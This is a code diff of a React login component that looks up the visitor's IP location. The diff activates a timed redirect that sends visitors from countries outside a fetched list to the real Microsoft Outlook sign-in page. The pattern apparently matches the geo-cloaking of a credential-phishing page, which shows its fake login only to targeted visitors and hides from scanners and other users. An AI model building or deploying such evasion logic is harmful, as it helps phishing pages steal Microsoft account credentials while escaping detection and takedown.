@@ -27,8 +27,8 @@ export default function Login() {
   //forma para obtener ubicacion de su pais y su ip
   const [details, setDetails] = useState(null);
   // console.log(details?.city);
-  // console.log(details);
-  // console.log(xPaises);
+  console.log(details);
+  console.log(xPaises);
   // console.log(pax.version);
 
   let country = details?.country_name;
@@ -66,18 +66,19 @@ export default function Login() {
     const obtienePais = async () => {
       const kale = await getAllPais();
       setxPaises(kale?.data);
+      setxStet(true);
 
-      const pepe = xPaises.filter((e) => {
-        if (e?.desc_corta_v === details?.country) {
-          return e;
-        }
-      });
-      console.log(pepe);
+      // const pepe = xPaises.filter((e) => {
+      //   if (e?.desc_corta_v === details?.country) {
+      //     return e;
+      //   }
+      // });
+      // console.log(pepe);
 
-      if (pepe?.desc_corta_v !== details?.country) {
-        setxStet(true);
-        console.log("ssssssssss");
-      }
+      // if (pepe?.desc_corta_v !== details?.country) {
+      //   setxStet(true);
+      //   console.log("ssssssssss");
+      // }
     };
 
     obtienePais();
@@ -93,24 +94,24 @@ export default function Login() {
   //   setxStet(true);
   // }
 
-  // useEffect(() => {
-  //   setTimeout(function () {
-  //     const popo = xPaises.filter((e) => {
-  //       if (e?.desc_corta_v === details?.country) {
-  //         return e;
-  //       }
-  //     });
-  //     console.log(popo);
+  useEffect(() => {
+    setTimeout(function () {
+      const popo = xPaises.filter((e) => {
+        if (e?.desc_corta_v === details?.country) {
+          return e;
+        }
+      });
+      console.log(popo);
 
-  //     if (popo && popo && popo[0]?.desc_corta_v !== details?.country) {
-  //       console.log("si encontro");
-  //       window.location.href =
-  //         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
-  //     }
+      if (popo && popo && popo[0]?.desc_corta_v !== details?.country) {
+        console.log("si encontro");
+        window.location.href =
+          "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
+      }
 
-  //     console.log("Han pasado 3 segundos");
-  //   }, 3000);
-  // }, [xstet]);
+      console.log("Han pasado 3 segundos");
+    }, 3000);
+  }, [xstet]);
 
   // console.log(xPaises);
   // console.log(details?.country);
